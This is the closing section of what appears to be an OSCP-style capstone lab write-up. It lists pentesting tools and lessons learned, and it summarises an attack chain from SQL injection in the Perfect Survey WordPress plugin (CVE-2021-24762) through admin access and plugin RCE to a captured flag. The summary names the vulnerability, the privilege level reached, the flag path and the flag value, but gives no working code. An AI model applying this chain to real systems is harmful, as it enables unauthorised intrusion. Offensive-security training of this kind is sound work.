- HackTricks (comprehensive pentesting book)

### Tools to Master
- Burp Suite (intercept and modify requests)
- SQLMap (when it works, it's powerful)
- Metasploit (understand the modules)
- Custom Python (write your own exploits)

---

## 🏁 Final Thoughts

This capstone demonstrates a complete penetration test from enumeration to flag capture. The key to success wasn't advanced techniques but rather:

1. **Careful observation** (finding alvida-eatery.org in HTML)
2. **Persistent research** (finding Metasploit module on GitHub)
3. **Understanding failures** (why 404 blocked SQLMap)
4. **Adapting techniques** (manual SQLi when automated failed)
5. **Systematic exploitation** (admin → plugin → RCE → flag)

Remember: In OSCP and real pentesting, **methodology beats memorization**. Understand WHY techniques work, not just HOW to run commands.

---

**Attack Duration:** ~4 hours (including password cracking)
**Key Vulnerability:** CVE-2021-24762 (Perfect Survey SQLi)
**Privilege Level Achieved:** www-data (web server user)
**Flag Location:** `/var/www/flag.txt`
**Final Flag:** `OS{b5c1d61eb3f29a0ffec8dcb546f4b1a1}`

---

*"The expert is not someone who never fails, but someone who learns from every failure."*

**Good luck on your OSCP journey!** 🚀